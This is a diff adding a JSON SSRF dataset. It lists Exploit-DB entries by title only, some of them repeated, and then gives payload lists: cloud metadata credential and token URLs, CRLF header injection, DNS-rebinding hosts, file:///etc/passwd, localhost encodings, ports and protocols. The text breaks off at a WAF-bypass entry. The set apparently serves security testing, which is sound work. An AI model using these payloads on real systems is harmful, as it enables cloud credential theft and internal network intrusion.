@@ -1,0 +1,620 @@
+[
+  {
+    "source": "exploit-db",
+    "id": "51039",
+    "title": "wkhtmltopdf 0.12.6 -  Server Side Request Forgery",
+    "type": "webapps",
+    "platform": "asp",
+    "content": "Exploit for wkhtmltopdf 0.12.6 -  Server Side Request Forgery. Platform: asp. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "50462",
+    "title": "Umbraco v8.14.1 - 'baseUrl' SSRF",
+    "type": "webapps",
+    "platform": "aspx",
+    "content": "Exploit for Umbraco v8.14.1 - 'baseUrl' SSRF. Platform: aspx. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "43045",
+    "title": "Mura CMS < 6.2 - Server-Side Request Forgery / XML External Entity Injection",
+    "type": "webapps",
+    "platform": "cfm",
+    "content": "Exploit for Mura CMS < 6.2 - Server-Side Request Forgery / XML External Entity Injection. Platform: cfm. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "51869",
+    "title": "Ladder v0.0.21 - Server-side request forgery (SSRF)",
+    "type": "webapps",
+    "platform": "go",
+    "content": "Exploit for Ladder v0.0.21 - Server-side request forgery (SSRF). Platform: go. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "51498",
+    "title": "Pydio Cells 4.1.2 - Server-Side Request Forgery",
+    "type": "webapps",
+    "platform": "go",
+    "content": "Exploit for Pydio Cells 4.1.2 - Server-Side Request Forgery. Platform: go. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "51582",
+    "title": "Ateme TITAN File 3.9 - SSRF File Enumeration",
+    "type": "webapps",
+    "platform": "hardware",
+    "content": "Exploit for Ateme TITAN File 3.9 - SSRF File Enumeration. Platform: hardware. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "48843",
+    "title": "BrightSign Digital Signage Diagnostic Web Server 8.2.26 - Server-Side Request Forgery (Unauthenticated)",
+    "type": "webapps",
+    "platform": "hardware",
+    "content": "Exploit for BrightSign Digital Signage Diagnostic Web Server 8.2.26 - Server-Side Request Forgery (Unauthenticated). Platform: hardware. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "45818",
+    "title": "D-LINK Central WifiManager CWM-100 - Server-Side Request Forgery",
+    "type": "webapps",
+    "platform": "hardware",
+    "content": "Exploit for D-LINK Central WifiManager CWM-100 - Server-Side Request Forgery. Platform: hardware. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "47764",
+    "title": "Inim Electronics Smartliving SmartLAN 6.x - Unauthenticated Server-Side Request Forgery",
+    "type": "webapps",
+    "platform": "hardware",
+    "content": "Exploit for Inim Electronics Smartliving SmartLAN 6.x - Unauthenticated Server-Side Request Forgery. Platform: hardware. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "49457",
+    "title": "Selea Targa IP OCR-ANPR Camera - Multiple SSRF (Unauthenticated)",
+    "type": "webapps",
+    "platform": "hardware",
+    "content": "Exploit for Selea Targa IP OCR-ANPR Camera - Multiple SSRF (Unauthenticated). Platform: hardware. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "44672",
+    "title": "Teradek VidiU Pro 3.0.3 - Server-Side Request Forgery",
+    "type": "webapps",
+    "platform": "hardware",
+    "content": "Exploit for Teradek VidiU Pro 3.0.3 - Server-Side Request Forgery. Platform: hardware. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "50405",
+    "title": "Keycloak 12.0.1 - 'request_uri ' Blind Server-Side Request Forgery (SSRF) (Unauthenticated)",
+    "type": "webapps",
+    "platform": "java",
+    "content": "Exploit for Keycloak 12.0.1 - 'request_uri ' Blind Server-Side Request Forgery (SSRF) (Unauthenticated). Platform: java. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "44945",
+    "title": "Liferay Portal < 7.0.4 - Server-Side Request Forgery",
+    "type": "webapps",
+    "platform": "java",
+    "content": "Exploit for Liferay Portal < 7.0.4 - Server-Side Request Forgery. Platform: java. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "42034",
+    "title": "Oracle PeopleSoft - Server-Side Request Forgery",
+    "type": "webapps",
+    "platform": "java",
+    "content": "Exploit for Oracle PeopleSoft - Server-Side Request Forgery. Platform: java. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "45158",
+    "title": "Wavemaker Studio 6.6 - Server-Side Request Forgery",
+    "type": "webapps",
+    "platform": "java",
+    "content": "Exploit for Wavemaker Studio 6.6 - Server-Side Request Forgery. Platform: java. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "42439",
+    "title": "DALIM SOFTWARE ES Core 5.0 build 7184.1 - Server-Side Request Forgery",
+    "type": "webapps",
+    "platform": "jsp",
+    "content": "Exploit for DALIM SOFTWARE ES Core 5.0 build 7184.1 - Server-Side Request Forgery. Platform: jsp. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "42340",
+    "title": "Oracle E-Business Suite 12.x - Server-Side Request Forgery",
+    "type": "webapps",
+    "platform": "jsp",
+    "content": "Exploit for Oracle E-Business Suite 12.x - Server-Side Request Forgery. Platform: jsp. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "46967",
+    "title": "Zimbra < 8.8.11 - XML External Entity Injection / Server-Side Request Forgery",
+    "type": "webapps",
+    "platform": "jsp",
+    "content": "Exploit for Zimbra < 8.8.11 - XML External Entity Injection / Server-Side Request Forgery. Platform: jsp. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "46967",
+    "title": "Zimbra < 8.8.11 - XML External Entity Injection / Server-Side Request Forgery",
+    "type": "webapps",
+    "platform": "jsp",
+    "content": "Exploit for Zimbra < 8.8.11 - XML External Entity Injection / Server-Side Request Forgery. Platform: jsp. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "46693",
+    "title": "Zimbra Collaboration - Autodiscover Servlet XXE and ProxyServlet SSRF (Metasploit)",
+    "type": "remote",
+    "platform": "linux",
+    "content": "Exploit for Zimbra Collaboration - Autodiscover Servlet XXE and ProxyServlet SSRF (Metasploit). Platform: linux. Type: remote."
+  },
+  {
+    "source": "exploit-db",
+    "id": "46693",
+    "title": "Zimbra Collaboration - Autodiscover Servlet XXE and ProxyServlet SSRF (Metasploit)",
+    "type": "remote",
+    "platform": "linux",
+    "content": "Exploit for Zimbra Collaboration - Autodiscover Servlet XXE and ProxyServlet SSRF (Metasploit). Platform: linux. Type: remote."
+  },
+  {
+    "source": "exploit-db",
+    "id": "46693",
+    "title": "Zimbra Collaboration - Autodiscover Servlet XXE and ProxyServlet SSRF (Metasploit)",
+    "type": "remote",
+    "platform": "linux",
+    "content": "Exploit for Zimbra Collaboration - Autodiscover Servlet XXE and ProxyServlet SSRF (Metasploit). Platform: linux. Type: remote."
+  },
+  {
+    "source": "exploit-db",
+    "id": "46693",
+    "title": "Zimbra Collaboration - Autodiscover Servlet XXE and ProxyServlet SSRF (Metasploit)",
+    "type": "remote",
+    "platform": "linux",
+    "content": "Exploit for Zimbra Collaboration - Autodiscover Servlet XXE and ProxyServlet SSRF (Metasploit). Platform: linux. Type: remote."
+  },
+  {
+    "source": "exploit-db",
+    "id": "45103",
+    "title": "Responsive Filemanager 9.13.1 - Server-Side Request Forgery",
+    "type": "webapps",
+    "platform": "linux",
+    "content": "Exploit for Responsive Filemanager 9.13.1 - Server-Side Request Forgery. Platform: linux. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "52116",
+    "title": "ollama 0.6.4 - Server Side Request Forgery (SSRF)",
+    "type": "local",
+    "platform": "multiple",
+    "content": "Exploit for ollama 0.6.4 - Server Side Request Forgery (SSRF). Platform: multiple. Type: local."
+  },
+  {
+    "source": "exploit-db",
+    "id": "39259",
+    "title": "Alfresco - '/cmisbrowser?url' Server-Side Request Forgery",
+    "type": "remote",
+    "platform": "multiple",
+    "content": "Exploit for Alfresco - '/cmisbrowser?url' Server-Side Request Forgery. Platform: multiple. Type: remote."
+  },
+  {
+    "source": "exploit-db",
+    "id": "39258",
+    "title": "Alfresco - '/proxy?endpoint' Server-Side Request Forgery",
+    "type": "remote",
+    "platform": "multiple",
+    "content": "Exploit for Alfresco - '/proxy?endpoint' Server-Side Request Forgery. Platform: multiple. Type: remote."
+  },
+  {
+    "source": "exploit-db",
+    "id": "52434",
+    "title": "ClipBucket 5.5.2 Build #90 - Server-Side Request Forgery (SSRF)",
+    "type": "remote",
+    "platform": "multiple",
+    "content": "Exploit for ClipBucket 5.5.2 Build #90 - Server-Side Request Forgery (SSRF). Platform: multiple. Type: remote."
+  },
+  {
+    "source": "exploit-db",
+    "id": "51111",
+    "title": "X-Skipper-Proxy v0.13.237 - Server Side Request Forgery (SSRF)",
+    "type": "remote",
+    "platform": "multiple",
+    "content": "Exploit for X-Skipper-Proxy v0.13.237 - Server Side Request Forgery (SSRF). Platform: multiple. Type: remote."
+  },
+  {
+    "source": "exploit-db",
+    "id": "49113",
+    "title": "Acronis Cyber Backup 12.5 Build 16341 - Unauthenticated SSRF",
+    "type": "webapps",
+    "platform": "multiple",
+    "content": "Exploit for Acronis Cyber Backup 12.5 Build 16341 - Unauthenticated SSRF. Platform: multiple. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "49070",
+    "title": "BigBlueButton 2.2.25 - Arbitrary File Disclosure and Server-Side Request Forgery",
+    "type": "webapps",
+    "platform": "multiple",
+    "content": "Exploit for BigBlueButton 2.2.25 - Arbitrary File Disclosure and Server-Side Request Forgery. Platform: multiple. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "49397",
+    "title": "Cockpit Version 234 - Server-Side Request Forgery (Unauthenticated)",
+    "type": "webapps",
+    "platform": "multiple",
+    "content": "Exploit for Cockpit Version 234 - Server-Side Request Forgery (Unauthenticated). Platform: multiple. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "46820",
+    "title": "Cortex Unshortenlink Analyzer < 1.1 - Server-Side Request Forgery",
+    "type": "webapps",
+    "platform": "multiple",
+    "content": "Exploit for Cortex Unshortenlink Analyzer < 1.1 - Server-Side Request Forgery. Platform: multiple. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "48765",
+    "title": "Ericom Access Server x64 9.2.0 - Server-Side Request Forgery",
+    "type": "webapps",
+    "platform": "multiple",
+    "content": "Exploit for Ericom Access Server x64 9.2.0 - Server-Side Request Forgery. Platform: multiple. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "49791",
+    "title": "Hasura GraphQL 1.3.3 - Service Side Request Forgery (SSRF)",
+    "type": "webapps",
+    "platform": "multiple",
+    "content": "Exploit for Hasura GraphQL 1.3.3 - Service Side Request Forgery (SSRF). Platform: multiple. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "52212",
+    "title": "IBMi Navigator 7.5 - Server Side Request Forgery (SSRF)",
+    "type": "webapps",
+    "platform": "multiple",
+    "content": "Exploit for IBMi Navigator 7.5 - Server Side Request Forgery (SSRF). Platform: multiple. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "49148",
+    "title": "ILIAS Learning Management System 4.3 - SSRF",
+    "type": "webapps",
+    "platform": "multiple",
+    "content": "Exploit for ILIAS Learning Management System 4.3 - SSRF. Platform: multiple. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "52211",
+    "title": "Plane 0.23.1 - Server side request forgery (SSRF)",
+    "type": "webapps",
+    "platform": "multiple",
+    "content": "Exploit for Plane 0.23.1 - Server side request forgery (SSRF). Platform: multiple. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "43404",
+    "title": "SAP BusinessObjects launch pad - Server-Side Request Forgery",
+    "type": "webapps",
+    "platform": "multiple",
+    "content": "Exploit for SAP BusinessObjects launch pad - Server-Side Request Forgery. Platform: multiple. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "40895",
+    "title": "Splunk Enterprise 6.4.3 - Server-Side Request Forgery",
+    "type": "webapps",
+    "platform": "multiple",
+    "content": "Exploit for Splunk Enterprise 6.4.3 - Server-Side Request Forgery. Platform: multiple. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "52365",
+    "title": "SugarCRM 14.0.0 - SSRF/Code Injection",
+    "type": "webapps",
+    "platform": "multiple",
+    "content": "Exploit for SugarCRM 14.0.0 - SSRF/Code Injection. Platform: multiple. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "49189",
+    "title": "Wordpress Plugin Canto 1.3.0 - Blind SSRF (Unauthenticated)",
+    "type": "webapps",
+    "platform": "multiple",
+    "content": "Exploit for Wordpress Plugin Canto 1.3.0 - Blind SSRF (Unauthenticated). Platform: multiple. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "43593",
+    "title": "Adminer 4.3.1 - Server-Side Request Forgery",
+    "type": "webapps",
+    "platform": "php",
+    "content": "Exploit for Adminer 4.3.1 - Server-Side Request Forgery. Platform: php. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "50021",
+    "title": "CKEditor 3 - Server-Side Request Forgery (SSRF)",
+    "type": "webapps",
+    "platform": "php",
+    "content": "Exploit for CKEditor 3 - Server-Side Request Forgery (SSRF). Platform: php. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "44567",
+    "title": "Cockpit CMS 0.4.4 < 0.5.5 - Server-Side Request Forgery",
+    "type": "webapps",
+    "platform": "php",
+    "content": "Exploit for Cockpit CMS 0.4.4 < 0.5.5 - Server-Side Request Forgery. Platform: php. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "49675",
+    "title": "CouchCMS 2.2.1 - Server-Side Request Forgery",
+    "type": "webapps",
+    "platform": "php",
+    "content": "Exploit for CouchCMS 2.2.1 - Server-Side Request Forgery. Platform: php. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "40628",
+    "title": "EC-CUBE 2.12.6 - Server-Side Request Forgery",
+    "type": "webapps",
+    "platform": "php",
+    "content": "Exploit for EC-CUBE 2.12.6 - Server-Side Request Forgery. Platform: php. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "41979",
+    "title": "I_ Librarian 4.6/4.7 - Command Injection / Server Side Request Forgery / Directory Enumeration / Cross-Site Scripting",
+    "type": "webapps",
+    "platform": "php",
+    "content": "Exploit for I_ Librarian 4.6/4.7 - Command Injection / Server Side Request Forgery / Directory Enumeration / Cross-Site Scripting. Platform: php. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "41979",
+    "title": "I_ Librarian 4.6/4.7 - Command Injection / Server Side Request Forgery / Directory Enumeration / Cross-Site Scripting",
+    "type": "webapps",
+    "platform": "php",
+    "content": "Exploit for I_ Librarian 4.6/4.7 - Command Injection / Server Side Request Forgery / Directory Enumeration / Cross-Site Scripting. Platform: php. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "47177",
+    "title": "Moodle Filepicker 3.5.2 - Server Side Request Forgery",
+    "type": "webapps",
+    "platform": "php",
+    "content": "Exploit for Moodle Filepicker 3.5.2 - Server Side Request Forgery. Platform: php. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "50921",
+    "title": "Navigate CMS 2.9.4 - Server-Side Request Forgery (SSRF) (Authenticated)",
+    "type": "webapps",
+    "platform": "php",
+    "content": "Exploit for Navigate CMS 2.9.4 - Server-Side Request Forgery (SSRF) (Authenticated). Platform: php. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "50670",
+    "title": "OpenBMCS 2.4 - Server Side Request Forgery (SSRF) (Unauthenticated)",
+    "type": "webapps",
+    "platform": "php",
+    "content": "Exploit for OpenBMCS 2.4 - Server Side Request Forgery (SSRF) (Unauthenticated). Platform: php. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "49441",
+    "title": "osTicket 1.14.2 - SSRF",
+    "type": "webapps",
+    "platform": "php",
+    "content": "Exploit for osTicket 1.14.2 - SSRF. Platform: php. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "51565",
+    "title": "PodcastGenerator 3.2.9 - Blind SSRF via XML Injection",
+    "type": "webapps",
+    "platform": "php",
+    "content": "Exploit for PodcastGenerator 3.2.9 - Blind SSRF via XML Injection. Platform: php. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "42894",
+    "title": "Trend Micro OfficeScan 11.0/XG (12.0) - Server Side Request Forgery",
+    "type": "webapps",
+    "platform": "php",
+    "content": "Exploit for Trend Micro OfficeScan 11.0/XG (12.0) - Server Side Request Forgery. Platform: php. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "40225",
+    "title": "vBulletin 5.2.2 - Server-Side Request Forgery",
+    "type": "webapps",
+    "platform": "php",
+    "content": "Exploit for vBulletin 5.2.2 - Server-Side Request Forgery. Platform: php. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "51743",
+    "title": "Webedition CMS v2.9.8.8 - Blind SSRF",
+    "type": "webapps",
+    "platform": "php",
+    "content": "Exploit for Webedition CMS v2.9.8.8 - Blind SSRF. Platform: php. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "49154",
+    "title": "WonderCMS 3.1.3 - Authenticated SSRF to Remote Remote Code Execution",
+    "type": "webapps",
+    "platform": "php",
+    "content": "Exploit for WonderCMS 3.1.3 - Authenticated SSRF to Remote Remote Code Execution. Platform: php. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "49534",
+    "title": "YetiShare File Hosting Script 5.1.0 - 'url' Server-Side Request Forgery",
+    "type": "webapps",
+    "platform": "php",
+    "content": "Exploit for YetiShare File Hosting Script 5.1.0 - 'url' Server-Side Request Forgery. Platform: php. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "51030",
+    "title": "CVAT 2.0 - Server Side Request Forgery",
+    "type": "webapps",
+    "platform": "python",
+    "content": "Exploit for CVAT 2.0 - Server Side Request Forgery. Platform: python. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "51109",
+    "title": "Label Studio 1.5.0 - Authenticated Server Side Request Forgery (SSRF)",
+    "type": "webapps",
+    "platform": "python",
+    "content": "Exploit for Label Studio 1.5.0 - Authenticated Server Side Request Forgery (SSRF). Platform: python. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "49663",
+    "title": "Microsoft Exchange 2019 - Server-Side Request Forgery",
+    "type": "remote",
+    "platform": "windows",
+    "content": "Exploit for Microsoft Exchange 2019 - Server-Side Request Forgery. Platform: windows. Type: remote."
+  },
+  {
+    "source": "exploit-db",
+    "id": "49637",
+    "title": "Microsoft Exchange 2019 - Server-Side Request Forgery (Proxylogon) (PoC)",
+    "type": "webapps",
+    "platform": "windows",
+    "content": "Exploit for Microsoft Exchange 2019 - Server-Side Request Forgery (Proxylogon) (PoC). Platform: windows. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "49982",
+    "title": "Microsoft SharePoint Server 16.0.10372.20060 - 'GetXmlDataFromDataSource' Server-Side Request Forgery (SSRF)",
+    "type": "webapps",
+    "platform": "windows",
+    "content": "Exploit for Microsoft SharePoint Server 16.0.10372.20060 - 'GetXmlDataFromDataSource' Server-Side Request Forgery (SSRF). Platform: windows. Type: webapps."
+  },
+  {
+    "source": "exploit-db",
+    "id": "42118",
+    "title": "Subsonic 6.1.1 - Server-Side Request Forgery",
+    "type": "webapps",
+    "platform": "windows",
+    "content": "Exploit for Subsonic 6.1.1 - Server-Side Request Forgery. Platform: windows. Type: webapps."
+  },
+  {
+    "source": "local-payload",
+    "filename": "cloud_metadata.txt",
+    "technique": "Cloud Metadata",
+    "target": "AWS/Azure/GCP",
+    "content": "# Cloud Metadata Payloads\n# AWS\n169.254.169.254/latest/meta-data/\n169.254.169.254/latest/user-data/\n169.254.169.254/latest/meta-data/iam/security-credentials/\n169.254.169.254/latest/meta-data/iam/security-credentials/ecs-task-role\n169.254.169.254/latest/dynamic/instance-identity/document\n169.254.169.254/latest/api/token\n169.254.170.2/v2/credentials\n\n# Google Cloud\nmetadata.google.internal/computeMetadata/v1/\nmetadata.google.internal/computeMetadata/v1beta1/\n169.254.169.254/computeMetadata/v1/\nmetadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\nmetadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true\n\n# Azure\n169.254.169.254/metadata/instance?api-version=2021-02-01\n169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\n169.254.169.254/metadata/scheduledevents?api-version=2020-07-01\n\n# Digital Ocean\n169.254.169.254/metadata/v1.json\n169.254.169.254/metadata/v1/id\n169.254.169.254/metadata/v1/hostname\n\n# Alibaba Cloud\n100.100.100.200/latest/meta-data/\n100.100.100.200/latest/meta-data/instance-id\n100.100.100.200/latest/user-data\n\n# Oracle Cloud\n192.0.0.192/opc/v1/instance/\n192.0.0.192/opc/v1/vnics/\n192.0.0.192/opc/v2/instance/\n\n# Kubernetes\nkubernetes.default.svc\nkubernetes.default.svc.cluster.local\n\n# Scaleway\n169.254.42.42/conf\n\n# Equinix Metal (Packet)\nmetadata.packet.net/userdata\n\n# Docker Internal\nhost.docker.internal\ndocker.for.mac.localhost"
+  },
+  {
+    "source": "local-payload",
+    "filename": "crlf_ssrf.txt",
+    "technique": "General SSRF",
+    "target": "Unknown",
+    "content": "# Payloads for CRLF-based SSRF. {host} will be replaced by the target payload.\n# These are injected into headers.\nignored.com%0d%0aHost:%20{host}\nignored.com%0d%0aX-Forwarded-Host:%20{host}\nignored.com%0d%0aX-Real-IP:%20{host}\nignored.com%0d%0aGET%20/index.html%20HTTP/1.1%0d%0aHost:%20{host}%0d%0aConnection:%20close%0d%0a%0d%0a\nignored.com%0d%0aGET%20http://{host}/%20HTTP/1.1%0d%0aHeader:%20value\nignored.com%0aHost:%20{host}\nignored.com%0dHost:%20{host}\nignored.com%20%0d%0aHost:%20{host}"
+  },
+  {
+    "source": "local-payload",
+    "filename": "dns_rebinding.txt",
+    "technique": "DNS Rebinding",
+    "target": "Internal Network",
+    "content": "# DNS Rebinding Payloads\n127.0.0.1.nip.io\n127.0.0.1.xip.io\n127.0.0.1.localtest.me\n127.0.0.1.burpcollaborator.net\nlocalhost.nip.io\nlocalhost.xip.io\nlocalhost.localtest.me\nlocalhost.burpcollaborator.net\n127.0.0.1.sslip.io\nlocalhost.sslip.io\n127.0.0.1.labs\nlocalhost.labs\n127.0.0.1.nip.io:80\n127.0.0.1.nip.io:443\n127.0.0.1.xip.io:80\n127.0.0.1.xip.io:443\nlocalhost.nip.io:80\nlocalhost.nip.io:443\nlocalhost.xip.io:80\nlocalhost.xip.io:443\na.<BURP-COLLABORATOR>\nb.<BURP-COLLABORATOR>\nc.<BURP-COLLABORATOR>\nd.<BURP-COLLABORATOR>\ne.<BURP-COLLABORATOR>\n127.0.0.1.example.com\n127.0.0.1.attackerdomain.tld\n127.0.0.1.any.domain\n127.0.0.1.fake.internal\n127.0.0.1.interactsh.com\n127.0.0.1.rebind.network\n127.0.0.1.rebindtest.com\n127.0.0.1.rebind.it\n127.0.0.1.rbndr.us\nlocalhost.rbndr.us\nprivate.rbndr.us\ninternal.rbndr.us\ns.rbndr.us\n1.1.1.1.rebind.network\non.rebind.it\nlock.rebind.it\n*.d.rebind.it\n*.any.rebind.it\n*.s.rebind.it\n*.w.rebind.it"
+  },
+  {
+    "source": "local-payload",
+    "filename": "encoded_payloads.txt",
+    "technique": "General SSRF",
+    "target": "Unknown",
+    "content": "# Base payloads for encoding attacks\n127.0.0.1\nlocalhost\ngoogle.com\nbing.com\n169.254.169.254/latest/meta-data/\n127.0.0.1:22\n127.0.0.1:8080\nfile:///etc/passwd\nfile:///c:/windows/win.ini\nhttp://127.0.0.1\nhttps://127.0.0.1"
+  },
+  {
+    "source": "local-payload",
+    "filename": "headers.txt",
+    "technique": "General SSRF",
+    "target": "Unknown",
+    "content": "# Standard Headers\nHost\nX-Forwarded-For\nX-Forwarded-Host\nX-Client-IP\nX-Remote-IP\nX-Remote-Addr\nX-Original-URL\nX-Forwarded-Server\nX-Host\nX-Custom-IP-Authorization\nX-Forwarded-Proto\nX-Real-IP\nClient-IP\nTrue-Client-IP\nCluster-Client-IP\nX-ProxyUser-Ip\nX-Forwarded-By\nX-Originating-IP\nX-Host-Override\nX-Rewrite-URL\nBase-Url\nHttp-Url\nProxy-Url\nReal-Ip\nRedirect\nRequest-Uri\nX-Original-Host\nX-Original-Remote-Addr\nX-Forwarded-For-Original\nX-Forwarded-For-Internal\nX-Client-Host\nX-Forwarded-For-Ip\nForwarded-For\nForwarded\nForwarded-Host\nForwarded-Proto\nX-Real-Host\nForwarded-Server\nX-Original-Forwarded-For\nX-Forwarded\nX-Requested-With\nX-Forwarded-Protocol\nX-Forwarded-Port\nVia\nProxy-Authorization\nX-Api-Version\nX-Url-Scheme\nX-Http-Method-Override\nX-Method-Override\nX-Real-Method\nX-Forwarded-Group\nX-Forwarded-User\nX-User-IP\nX-Application-Context\nX-Forwarded-Access-Token\nReferer\nFrom\nContact\nX-Wap-Profile\nProfile\nX-Arg\nX-HTTP-DestinationURL\nX-Original-URI\nDestination\nCF-Connecting-IP\nFastly-Client-IP\nIncap-Client-IP\nAkamai-Origin-Hop"
+  },
+  {
+    "source": "local-payload",
+    "filename": "local_ips.txt",
+    "technique": "Internal Scanning",
+    "target": "Localhost/Intranet",
+    "content": "# Local IP Payloads\n# Standard localhost variations\n127.0.0.1\nlocalhost\n[::1]\n::1\n127.0.0.1:80\n127.0.0.1:443\nlocalhost:80\nlocalhost:443\n0\n0.0.0.0\n127.1\n127.0.1\n127.0.0.0\n127.127.127.127\n127.0.0.1.nip.io\nloopback\n\n# IP encoding variations\n2130706433\n0x7f000001\n0177.0.0.1\n0177.0000.0000.0001\n\n# Dotted decimal variations\n127.0.0.1.\n127.0.0.1..\n.localhost\n..localhost\n.127.0.0.1\n\n# Mixed encoding\n0x7f.0.0.1\n0177.0.0.1\n127.0x0.0x0.0x1\n\n# IPv6 variations\n[0:0:0:0:0:ffff:127.0.0.1]\n[::ffff:127.0.0.1]\n[::ffff:7f00:1]\n0000::1\n0:\n0:0:0:0:0:0:0:1\n\n# Internal network ranges\n10.0.0.1\n10.0.0.2\n172.16.0.1\n172.16.0.2\n192.168.0.1\n192.168.1.1\n192.168.1.254\n192.168.1.100\n10.0.0.0/8\n172.16.0.0/12\n192.168.0.0/16\n169.254.169.254\n\n# Special hostnames\ninternal\nintranet\nlocal\nprivate\nlocalhost.localdomain\ngateway\nrouter\napi.internal\ndb.internal"
+  },
+  {
+    "source": "local-payload",
+    "filename": "parameter_payloads.txt",
+    "technique": "General SSRF",
+    "target": "Unknown",
+    "content": "# URL Parameters\nurl\nu\nq\npath\nhref\ndest\nredirect\nuri\ncontinue\nurl_success\nnext\nredir\nredirect_uri\nreturn\nreturn_path\npath_return\nret\nfile\ndocument\nfilename\nfile_path\npath_file\ndoc\npdf\nphp_path\nload_file\nwindow\ndata\nreference\nsite\nhtml\nval\nvalidate\ndomain\ncallback\npage\nfeed\nfeeduri\nhost\nport\nto\nout\nview\ndir\ntarget\nrurl\ndestination\nredirect_url\nreturnTo\nreturn_to\ncheckout_url\nimage_url\ngo\nreturn_path\nshow\ncontent\nnavigation\nopen\nfeed_url\nimage\nimg\npic\npicture\nphoto\nimg_url\npage_url\nproxy\nfetch\nendpoint\napi_url\nservice\nprovider\nresource\nimport\nexport\nload\ninclude\ntemplate\nstyle\nstylesheet\nscript\nreturnUrl\nreturnURL\nredirectUrl\nasset\ndomain_name\npage-url\nfile-path\nfile_url\nfrom_url\ndata_url\nproxy_url\nredir_url\nremote\nrequest\nservice_url\nsite_url\nupload_url\nview_url\nwebsite\nweb_url\nx\nouturl\nforward\ncgi\n"
+  },
+  {
+    "source": "local-payload",
+    "filename": "port_payloads.txt",
+    "technique": "General SSRF",
+    "target": "Unknown",
+    "content": "# Port Scan Payloads (format: :port or /:port)\n:21\n:22\n:23\n:25\n:53\n:80\n:81\n:88\n:110\n:135\n:139\n:143\n:389\n:443\n:445\n:587\n:636\n:993\n:995\n:1080\n:1433\n:1521\n:1723\n:2049\n:3000\n:3128\n:3306\n:3389\n:4567\n:5000\n:5432\n:5900\n:5985\n:5986\n:5601\n:5984\n:6379\n:7001\n:8000\n:8008\n:8080\n:8081\n:8088\n:8443\n:8888\n:8983\n:9000\n:9090\n:9200\n:9300\n:11211\n:15672\n:16379\n:27017\n:27018"
+  },
+  {
+    "source": "local-payload",
+    "filename": "protocols.txt",
+    "technique": "General SSRF",
+    "target": "Unknown",
+    "content": "# Standard Protocols\nhttp://\nhttps://\nftp://\nsftp://\nftps://\nscp://\nssh://\ntelnet://\nfile://\ndict://\ngopher://\nldap://\nldaps://\nmysql://\nmongodb://\npostgres://\nredis://\nmemcache://\nws://\nwss://\nsmtp://\npop3://\nimap://\nsmb://\nnfs://\ntftp://\nrtsp://\nrtmp://\nsvn://\ngit://\nsvn+ssh://\nrsync://\ns3://\ntcp://\nudp://\nsip://\nsips://\nsftp://\nhttp+unix://\nunix://\nchrome://\nabout://\ndata://\njavascript://\nmailto://\nnews://\nnntp://\nwebdav://\nwebdavs://\nirc://\nircs://\njar://\nzip://\nphar://\nphp://\nzlib://\nglob://\nexpect://\nogg://\nssh2.sftp://\nssh2.shell://\nssh2.exec://\nphar://"
+  },
+  {
+    "source": "local-payload",
+    "filename": "waf_bypass.txt",
+    "technique": "WAF Bypass",
+    "target": "Hardened Perimeter",
